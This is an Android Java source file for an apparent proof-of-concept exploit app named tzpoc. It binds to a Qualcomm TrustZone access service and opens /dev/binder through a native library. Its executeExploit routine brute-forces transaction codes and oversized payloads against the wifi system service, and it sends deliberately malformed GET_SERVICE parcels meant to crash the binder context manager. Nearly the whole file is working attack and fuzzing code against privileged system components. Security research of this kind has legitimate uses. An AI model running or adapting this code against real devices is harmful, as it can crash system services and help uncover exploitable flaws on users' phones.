package com.example.tzpoc;

import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.ServiceConnection;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.ParcelFileDescriptor;
import android.os.RemoteException;
import android.view.View;
import android.widget.Button;
import android.widget.ScrollView;
import android.widget.TextView;
import android.widget.Toast;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import com.qualcomm.qti.qms.api.minksocket.IMinkSocketFd;

import java.io.File;
import java.io.FileOutputStream;
import java.io.OutputStreamWriter;
import java.io.PrintWriter;
import java.nio.charset.StandardCharsets;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.Locale;
import java.util.concurrent.atomic.AtomicBoolean;

public class MainActivity extends AppCompatActivity {
    private static final String TARGET_PKG = "com.qualcomm.qti.qms.service.trustzoneaccess";
    private static final String TARGET_CLS = "com.qualcomm.qti.qms.service.trustzoneaccess.TZAccessService";

    private TextView tvStatus, tvLog;
    private Button btnStart, btnStop;
    private Handler handler = new Handler(Looper.getMainLooper());
    private StringBuilder logBuilder = new StringBuilder();
    private IMinkSocketFd tzService;
    private boolean isBound = false;
    private AtomicBoolean isTesting = new AtomicBoolean(false);
    private AtomicBoolean stopRequested = new AtomicBoolean(false);
    private Thread testThread;

    static {
        System.loadLibrary("pocjni");
    }

    public static native int nativeOpenDevice(String path);
    public static native byte[] nativeBinderTransaction(int fd, int handle, int code, int flags, byte[] data);
    public static native byte[] nativeBinderGetService(int fd, String serviceName, String descriptor);
    public static native String nativeBinderDumpReply(int fd, int handle, int code, int flags, byte[] data);
    public static native int nativeBinderWriteToService(int fd, int handle, int code, int flags, byte[] data);
    public static native byte[] nativeBuildGetServiceParcel(String descriptor);

    private ServiceConnection tzConnection = new ServiceConnection() {
        @Override
        public void onServiceConnected(ComponentName name, IBinder service) {
            tzService = IMinkSocketFd.Stub.asInterface(service);
            if (tzService != null) {
                appendLog("[TZ] Service bound");
                updateStatus("Bound - starting");
                enableButtons(false, true);
                stopRequested.set(false);
                testThread = new Thread(() -> executeExploit());
                testThread.start();
            } else {
                appendLog("[TZ] Failed to cast");
                enableButtons(true, false);
            }
        }

        @Override
        public void onServiceDisconnected(ComponentName name) {
            tzService = null;
            isBound = false;
            enableButtons(true, false);
            updateStatus("Disconnected");
        }
    };

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        tvStatus = findViewById(R.id.tv_status);
        tvLog = findViewById(R.id.tv_log);
        btnStart = findViewById(R.id.btn_start);
        btnStop = findViewById(R.id.btn_stop);

        requestPermissions();

        btnStart.setOnClickListener(v -> {
            if (!isTesting.get()) {
                isTesting.set(true);
                enableButtons(false, true);
                stopRequested.set(false);
                bindService();
            }
        });
        btnStop.setOnClickListener(v -> {
            if (isTesting.get()) {
                stopRequested.set(true);
                if (testThread != null) testThread.interrupt();
                enableButtons(false, false);
                updateStatus("Stopping...");
                appendLog("--- Stop requested ---");
                saveLog();
                enableButtons(true, false);
                isTesting.set(false);
            }
        });
        appendLog("App started. Press 'Start'.");
    }

    private void requestPermissions() {
        String[] perms = {
                android.Manifest.permission.READ_EXTERNAL_STORAGE,
                android.Manifest.permission.WRITE_EXTERNAL_STORAGE
        };
        List<String> toRequest = new ArrayList<>();
        for (String p : perms) {
            if (ContextCompat.checkSelfPermission(this, p) != PackageManager.PERMISSION_GRANTED) {
                toRequest.add(p);
            }
        }
        if (!toRequest.isEmpty()) {
            ActivityCompat.requestPermissions(this, toRequest.toArray(new String[0]), 100);
        }
    }

    private void bindService() {
        try {
            Intent intent = new Intent();
            intent.setClassName(TARGET_PKG, TARGET_CLS);
            boolean ret = bindService(intent, tzConnection, Context.BIND_AUTO_CREATE);
            if (ret) {
                appendLog("Binding service...");
                updateStatus("Binding...");
                isBound = true;
            } else {
                appendLog("bindService failed");
                updateStatus("Bind failed");
                enableButtons(true, false);
                isTesting.set(false);
            }
        } catch (Exception e) {
            appendLog("Bind exception: " + e.toString());
            updateStatus("Exception");
            enableButtons(true, false);
            isTesting.set(false);
        }
    }

    private void enableButtons(boolean startEnabled, boolean stopEnabled) {
        handler.post(() -> {
            btnStart.setEnabled(startEnabled);
            btnStop.setEnabled(stopEnabled);
        });
    }

    private void executeExploit() {
        appendLog("========================================");
        appendLog("========== BINDER WIFI EXPLORATION ==========");

        int fd = nativeOpenDevice("/dev/binder");
        if (fd < 0) {
            fd = nativeOpenDevice("/dev/hwbinder");
        }
        if (fd < 0) {
            appendLog("[!] No binder device");
            return;
        }
        appendLog("[+] Using fd=" + fd);

        appendLog("[*] Getting wifi service handle with correct descriptor format");
        byte[] svcReply = nativeBinderGetService(fd, "wifi", "android.net.wifi.IWifiManager");
        int wifiHandle = -1;
        if (svcReply != null && svcReply.length >= 4) {
            wifiHandle = ((svcReply[0] & 0xFF) |
                          ((svcReply[1] & 0xFF) << 8) |
                          ((svcReply[2] & 0xFF) << 16) |
                          ((svcReply[3] & 0xFF) << 24));
            appendLog("[GETSVC] wifi -> handle=" + wifiHandle + " (0x" + Integer.toHexString(wifiHandle) + ")");
            dumpToFile(svcReply, "getsvc_wifi.bin");
        } else {
            appendLog("[GETSVC] wifi -> no reply");
        }

        if (wifiHandle > 0) {
            appendLog("[*] WiFi handle obtained, testing methods");
            testWifiMethods(fd, wifiHandle);
        } else {
            appendLog("[!] WiFi handle not found, trying fallback handles 1-5");
            for (int h = 1; h <= 5; h++) {
                appendLog("[*] Testing handle " + h + " as potential wifi service");
                testWifiMethods(fd, h);
            }
        }

        appendLog("[*] Testing context manager with malformed GET_SERVICE");
        testContextManagerCrash(fd);

        try {
            ParcelFileDescriptor.adoptFd(fd).close();
        } catch (Exception e) {}

        appendLog("========== TEST COMPLETED ==========");
        appendLog("========================================");
        updateStatus("Done");
        isTesting.set(false);
        enableButtons(true, false);
        saveLog();
        finishTest();
    }

    private void testWifiMethods(int fd, int handle) {
        appendLog("[WIFI] Testing handle " + handle);

        int[] wifiCodes = {
            1, 2, 3, 4, 5, 6, 7, 8, 9, 10,
            11, 12, 13, 14, 15, 16, 17, 18, 19, 20,
            21, 22, 23, 24, 25, 26, 27, 28, 29, 30,
            31, 32, 33, 34, 35, 36, 37, 38, 39, 40,
            41, 42, 43, 44, 45, 46, 47, 48, 49, 50
        };

        for (int code : wifiCodes) {
            if (stopRequested.get()) break;
            byte[] data = null;
            if (code == 1 || code == 2 || code == 3 || code == 4 || code == 5) {
                data = new byte[4];
                data[0] = 1;
            }
            String result = nativeBinderDumpReply(fd, handle, code, 0, data);
            appendLog("[WIFI] code=0x" + Integer.toHexString(code) + " -> " + result);
            try { Thread.sleep(10); } catch (Exception e) {}
        }

        byte[] largeData = new byte[4096];
        for (int i = 0; i < largeData.length; i++) largeData[i] = (byte)(i & 0xFF);
        for (int code : new int[]{1, 2, 3, 4, 5, 6, 7, 8, 9, 10}) {
            if (stopRequested.get()) break;
            String result = nativeBinderDumpReply(fd, handle, code, 1, largeData);
            appendLog("[WIFI-ONEWAY] code=0x" + Integer.toHexString(code) + " -> " + result);
            try { Thread.sleep(10); } catch (Exception e) {}
        }

        for (int size : new int[]{16, 32, 64, 128, 256, 512, 1024, 2048, 4096, 8192, 16384}) {
            byte[] d = new byte[size];
            for (int i = 0; i < d.length; i++) d[i] = (byte)((i * 7) & 0xFF);
            String result = nativeBinderDumpReply(fd, handle, 1, 0, d);
            appendLog("[WIFI-SIZE] " + size + " bytes -> " + result);
            try { Thread.sleep(10); } catch (Exception e) {}
        }
    }

    private void testContextManagerCrash(int fd) {
        appendLog("[CRASH-CTX] Sending malformed GET_SERVICE to context manager");

        appendLog("[CRASH-CTX] empty data (no parcel)");
        byte[] reply = nativeBinderTransaction(fd, 0, 1, 0, null);
        if (reply == null) {
            appendLog("[CRASH-CTX] no reply");
        } else {
            appendLog("[CRASH-CTX] reply len=" + reply.length);
        }

        byte[] lenOnly = new byte[4];
        lenOnly[0] = 100;
        appendLog("[CRASH-CTX] length=100 with no data");
        reply = nativeBinderTransaction(fd, 0, 1, 0, lenOnly);
        if (reply == null) {
            appendLog("[CRASH-CTX] no reply");
        } else {
            appendLog("[CRASH-CTX] reply len=" + reply.length);
        }

        byte[] wrongLen = new byte[4 + 5];
        wrongLen[0] = 100;
        wrongLen[1] = 0;
        wrongLen[2] = 0;
        wrongLen[3] = 0;
        String svc = "wifi";
        System.arraycopy(svc.getBytes(StandardCharsets.UTF_8), 0, wrongLen, 4, svc.length());
        wrongLen[4 + svc.length()] = 0;
        appendLog("[CRASH-CTX] length=100 but actual data shorter");
        reply = nativeBinderTransaction(fd, 0, 1, 0, wrongLen);
        if (reply == null) {
            appendLog("[CRASH-CTX] no reply");
        } else {
            appendLog("[CRASH-CTX] reply len=" + reply.length);
        }
    }

    private void dumpToFile(byte[] data, String filename) {
        File dir = getDumpDir();
        if (dir == null || data == null) return;
        File file = new File(dir, filename);
        try (FileOutputStream fos = new FileOutputStream(file)) {
            fos.write(data);
            appendLog("[DUMP] Saved " + data.length + " bytes to " + file.getAbsolutePath());
        } catch (Exception e) {
            appendLog("[DUMP] Failed: " + e.getMessage());
        }
    }

    private File getDumpDir() {
        if (Environment.MEDIA_MOUNTED.equals(Environment.getExternalStorageState())) {
            File dir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS);
            if (dir != null && (dir.exists() || dir.mkdirs())) return dir;
        }
        return getFilesDir();
    }

    private void appendLog(final String msg) {
        String ts = new SimpleDateFormat("HH:mm:ss.SSS", Locale.getDefault()).format(new Date());
        final String line = "[" + ts + "] " + msg + "\n";
        logBuilder.append(line);
        handler.post(() -> {
            tvLog.append(line);
            View parent = (View) tvLog.getParent();
            if (parent instanceof ScrollView) ((ScrollView) parent).fullScroll(View.FOCUS_DOWN);
        });
    }

    private void updateStatus(final String status) {
        handler.post(() -> tvStatus.setText(status));
    }

    private void saveLog() {
        try {
            File dir = getDumpDir();
            File file = new File(dir, "binder_wifi_test_log.txt");
            try (PrintWriter pw = new PrintWriter(new OutputStreamWriter(new FileOutputStream(file), StandardCharsets.UTF_8))) {
                pw.println("=== Binder Wifi Test Log ===");
                pw.println("Timestamp: " + new Date().toString());
                pw.println("===================================");
                pw.print(logBuilder.toString());
                pw.flush();
            }
            appendLog("Log saved to " + file.getAbsolutePath());
        } catch (Exception e) {
            appendLog("Save failed: " + e.getMessage());
        }
    }

    private void finishTest() {
        handler.post(() -> {
            Toast.makeText(MainActivity.this, "Test completed", Toast.LENGTH_LONG).show();
            new Handler(Looper.getMainLooper()).postDelayed(() -> {
                finishAffinity();
                System.exit(0);
            }, 3000);
        });
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        stopRequested.set(true);
        if (testThread != null) testThread.interrupt();
        if (isBound) unbindService(tzConnection);
        saveLog();
    }
}
